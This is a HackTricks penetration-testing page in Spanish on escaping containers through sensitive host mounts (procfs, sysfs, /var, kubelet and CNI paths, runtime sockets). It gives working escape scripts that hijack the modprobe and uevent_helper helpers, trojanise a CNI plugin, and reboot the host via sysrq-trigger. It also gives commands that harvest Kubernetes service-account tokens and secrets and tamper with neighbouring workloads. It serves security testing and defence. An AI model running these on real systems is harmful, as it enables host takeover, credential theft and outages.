# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Los host mounts son una de las superficies prácticas más importantes para container-escape porque a menudo colapsan una vista de proceso cuidadosamente aislada y la devuelven a la visibilidad directa de los recursos del host. Los casos peligrosos no se limitan a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, estado gestionado por kubelet, o rutas relacionadas con dispositivos pueden exponer controles del kernel, credentials, archivos del filesystem de contenedores vecinos e interfaces de administración del runtime.

Esta página existe por separado de las páginas de protección individuales porque el modelo de abuso es transversal. Un host mount writable es peligroso en parte por mount namespaces, en parte por user namespaces, en parte por cobertura de AppArmor o SELinux, y en parte por qué ruta exacta del host quedó expuesta. Tratarlo como un tema propio hace que la superficie de ataque sea mucho más fácil de razonar.

## `/proc` Exposure

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Un bind mount como `-v /proc:/host/proc` o una vista de contenedor que expone entradas proc inesperadas y writable puede, por tanto, llevar a divulgación de información, denegación de servicio o ejecución directa de código en el host.

Las rutas de alto valor de procfs incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Empieza comprobando qué entradas de procfs de alto valor son visibles o writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Estas rutas son interesantes por diferentes razones. `core_pattern`, `modprobe` y `binfmt_misc` pueden convertirse en rutas de ejecución de código en el host cuando son escribibles. `kallsyms`, `kmsg`, `kcore` y `config.gz` son potentes fuentes de reconocimiento para kernel exploitation. `sched_debug` y `mountinfo` revelan el contexto de procesos, cgroup y filesystem que puede ayudar a reconstruir el layout del host desde dentro del container.

El valor práctico de cada ruta es diferente, y tratarlas a todas como si tuvieran el mismo impacto dificulta el triage:

- `/proc/sys/kernel/core_pattern`
Si es escribible, esta es una de las rutas procfs de mayor impacto porque el kernel ejecutará un pipe handler después de un crash. Un container que pueda apuntar `core_pattern` a un payload almacenado en su overlay o en un host path montado a menudo puede obtener host code execution. Consulta también [read-only-paths.md](protections/read-only-paths.md) para un ejemplo dedicado.
- `/proc/sys/kernel/modprobe`
Esta ruta controla el helper de userspace usado por el kernel cuando necesita invocar lógica de carga de módulos. Si es escribible desde el container e interpretada en el contexto del host, puede convertirse en otro primitive de host code execution. Es especialmente interesante cuando se combina con una forma de activar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente no es un primitive de escape limpio, pero puede convertir la presión de memoria en denial of service para todo el host al transformar condiciones de OOM en comportamiento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor mágico elegido y obtener ejecución en contexto del host cuando se ejecute un archivo coincidente.
- `/proc/config.gz`
Útil para el triage de kernel exploit. Ayuda a determinar qué subsistemas, mitigations y features opcionales del kernel están habilitados sin necesitar metadata de paquetes del host.
- `/proc/sysrq-trigger`
Principalmente una ruta de denial-of-service, pero muy seria. Puede reiniciar, provocar panic o interrumpir el host de inmediato.
- `/proc/kmsg`
Revela mensajes del ring buffer del kernel. Útil para host fingerprinting, análisis de crashes y, en algunos entornos, para filtrar información útil para kernel exploitation.
- `/proc/kallsyms`
Valioso cuando es legible porque expone información de símbolos exportados del kernel y puede ayudar a derrotar suposiciones de address randomization durante el desarrollo de kernel exploit.
- `/proc/[pid]/mem`
Esta es una interfaz directa de memoria de proceso. Si el proceso objetivo es accesible con las condiciones ptrace necesarias, puede permitir leer o modificar la memoria de otro proceso. El impacto realista depende mucho de credentials, `hidepid`, Yama y las restricciones de ptrace, así que es una ruta potente pero condicional.
- `/proc/kcore`
Expone una vista tipo core-image de la memoria del sistema. El archivo es enorme y torpe de usar, pero si es realmente legible indica una superficie de memoria del host mal expuesta.
- `/proc/kmem` y `/proc/mem`
Interfaces históricas de memoria raw de alto impacto. En muchos sistemas modernos están deshabilitadas o muy restringidas, pero si están presentes y son utilizables deben tratarse como hallazgos críticos.
- `/proc/sched_debug`
Filtra información de scheduling y tareas que puede exponer identidades de procesos del host incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
Extremadamente útil para reconstruir dónde vive realmente el container en el host, qué paths están respaldados por overlay y si un mount escribible corresponde a contenido del host o solo a la capa del container.

Si `/proc/[pid]/mountinfo` o los detalles de overlay son legibles, úsalos para recuperar el host path del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varias técnicas de host-execution requieren convertir una ruta dentro del container en la ruta correspondiente desde el punto de vista del host.

### Ejemplo completo: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` es escribible desde el container y la ruta del helper se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El disparador exacto depende del target y del comportamiento del kernel, pero el punto importante es que una ruta auxiliar escribible puede redirigir una futura invocación de kernel helper hacia contenido de host-path controlado por el atacante.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Si el objetivo es evaluar la explotabilidad en lugar de escapar de inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a responder si la información útil de símbolos es visible, si los mensajes recientes del kernel revelan un estado interesante y qué funciones o mitigaciones del kernel están compiladas. El impacto normalmente no es una escape directo, pero puede reducir drásticamente la triage de vulnerabilidades del kernel.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` es writable y alcanza la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es un reinicio inmediato del host. Este no es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que la divulgación de información.

## `/sys` Exposure

sysfs expone grandes cantidades de estado del kernel y del dispositivo. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar la ejecución de helper, el comportamiento del dispositivo, la configuración del security-module o el estado del firmware.

Las rutas sysfs de alto valor incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas importan por diferentes razones. `/sys/class/thermal` puede influir en el comportamiento de thermal-management y, por tanto, en la estabilidad del host en entornos mal expuestos. `/sys/kernel/vmcoreinfo` puede filtrar información de crash-dump y del kernel-layout que ayuda con el fingerprinting de bajo nivel del host. `/sys/kernel/security` es la interfaz `securityfs` usada por Linux Security Modules, así que el acceso inesperado allí puede exponer o alterar estado relacionado con MAC. Las rutas de variables EFI pueden afectar ajustes de arranque respaldados por el firmware, lo que las hace mucho más serias que los archivos de configuración ordinarios. `debugfs` bajo `/sys/kernel/debug` es especialmente peligroso porque es intencionalmente una interfaz orientada a desarrolladores, con muchas menos expectativas de seguridad que las APIs del kernel endurecidas y orientadas a producción.

Los comandos útiles para revisar estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Qué hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otra superficie de LSM es visible de una forma que debería haber permanecido solo en el host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y es legible o escribible, espera una amplia superficie orientada al kernel cuyo riesgo exacto depende de los nodos de debug habilitados.
- La exposición de variables EFI es menos común, pero si está presente tiene alto impacto porque toca configuraciones respaldadas por firmware en lugar de archivos normales en tiempo de ejecución.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host y la interacción con hardware, no para un escape elegante al estilo shell.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente de fingerprinting del host y análisis de crash, útil para entender el estado de bajo nivel del kernel.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede ejecutar un helper controlado por un atacante cuando se dispara un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de dentro del contenedor actual.

## Exposición de `/var`

Montar `/var` del host dentro de un contenedor a menudo se subestima porque no parece tan dramático como montar `/`. En la práctica puede ser suficiente para alcanzar runtime sockets, directorios de snapshots de containers, volúmenes de pods gestionados por kubelet, tokens de service-account proyectados y filesystems de aplicaciones vecinas. En nodos modernos, `/var` es a menudo donde realmente vive el estado de containers más interesante desde el punto de vista operativo.

### Ejemplo de Kubernetes

Un pod con `hostPath: /var` a menudo puede leer los projected tokens de otros pods y el contenido de overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque responden si el mount expone solo datos de aplicación poco interesantes o credenciales de clúster de alto impacto. Un token de service-account legible puede convertir de inmediato la ejecución local de código en acceso a la API de Kubernetes.

Si el token está presente, valida a qué puede acceder en lugar de detenerte en descubrir el token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso local al nodo. Un token con RBAC amplio puede convertir un `/var` montado en un compromiso de todo el clúster.

### Docker And containerd Example

En hosts Docker, los datos relevantes suelen estar en `/var/lib/docker`, mientras que en nodos Kubernetes respaldados por containerd pueden estar en `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenidos de snapshot escribibles de otro workload, el atacante puede ser capaz de alterar archivos de la aplicación, plantar contenido web o cambiar scripts de inicio sin tocar la configuración del contenedor actual.

Ideas concretas de abuso una vez se encuentra contenido de snapshot escribible:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto de `/var` montado: manipulación de aplicaciones, recuperación de secrets y movimiento lateral hacia workloads vecinos.

## Kubelet State, Plugins, And CNI Paths

Un mount de `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` suele exponerse a través de privileged DaemonSets, CNI agents, CSI node plugins, GPU operators y storage helpers. Estos mounts son fáciles de descartar como "node plumbing", pero se sitúan directamente en la ruta de ejecución de nuevos pods y a menudo contienen kubelet credentials, projected secrets, registration sockets y binarios de plugins ejecutables del host.

Los objetivos de alto valor incluyen:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Los comandos de revisión útiles son:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por qué estas rutas importan:

- `/var/lib/kubelet/pki` puede exponer certificados cliente de kubelet y otras credenciales locales del nodo que a veces pueden reutilizarse contra el API server o endpoints TLS orientados a kubelet, según el diseño del cluster.
- `/var/lib/kubelet/pods` a menudo contiene service-account tokens proyectados y Secrets montados para pods vecinos en el mismo nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` es principalmente una superficie de reconocimiento, pero muy útil: revela qué pods y containers controlan actualmente GPUs, hugepages, dispositivos SR-IOV y otros recursos escasos locales del nodo.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` y `/var/lib/kubelet/plugins_registry` revelan qué plugins CSI, DRA y device están instalados y con qué sockets se espera que hable kubelet. Si esos directorios son escribibles en lugar de solo legibles, el hallazgo se vuelve mucho más serio.
- `/opt/cni/bin` y `/etc/cni/net.d` están directamente en la ruta de configuración de la red del pod. El acceso de escritura allí suele ser un primitive de host-execution diferido, no solo una exposición de configuración.

### Full Example: Escribible `/opt/cni/bin`

Si un directorio de binarios CNI del host está montado con permisos de lectura-escritura, reemplazar un plugin puede ser suficiente para obtener host execution la próxima vez que kubelet cree un pod sandbox en ese nodo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Esto no es tan inmediato como un `docker.sock` montado, pero a menudo es más realista en pods de infraestructura de Kubernetes comprometidos. El punto importante es que el binario modificado se ejecuta más tarde por el flujo de configuración de red del host, no por el contenedor actual.


## Runtime Sockets

Los sensitive host mounts a menudo incluyen runtime sockets en lugar de directorios completos. Son tan importantes que merecen repetirse explícitamente aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
See [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para ver los flujos de explotación completos una vez que uno de estos sockets está montado.

Como patrón rápido de primera interacción:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, la ruta desde "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corta que cualquier ruta de kernel breakout.

## Mount-Related CVEs

Los host mounts también intersectan con vulnerabilidades de runtime. Ejemplos recientes importantes incluyen:

- `CVE-2024-21626` en `runc`, donde un descriptor de archivo de directorio filtrado podría colocar el directorio de trabajo en el filesystem del host.
- `CVE-2024-23651`, `CVE-2024-23652` y `CVE-2024-23653` en BuildKit, donde Dockerfiles maliciosos, frontends y flujos `RUN --mount` podrían reintroducir acceso a archivos del host, eliminación o privilegios elevados durante los builds.
- `CVE-2024-1753` en Buildah y los flujos de build de Podman, donde bind mounts creados específicamente durante el build podrían exponer `/` con lectura y escritura.
- `CVE-2025-47290` en `containerd` 2.1.0, donde una TOCTOU durante el unpack de la imagen podría permitir que una imagen especialmente manipulada modifique el filesystem del host durante el pull.

Estos CVEs importan aquí porque muestran que el manejo de mounts no trata solo de la configuración del operador. El propio runtime también puede introducir condiciones de escape impulsadas por mounts.

## Checks

Usa estos comandos para localizar rápidamente las exposiciones de mount de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Lo interesante aquí:

- Host root, `/proc`, `/sys`, `/var` y runtime sockets son hallazgos de alta prioridad.
- Las entradas proc/sys escribibles a menudo significan que el mount expone controles del kernel globales del host en lugar de una vista segura del container.
- Las rutas montadas de `/var` merecen revisión de credenciales y de workloads vecinas, no solo revisión del filesystem.
- Los directorios de estado de kubelet y las rutas de CNI/plugins merecen la misma prioridad que los runtime sockets porque a menudo se sitúan directamente en la ruta de creación de pods y distribución de credenciales del node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
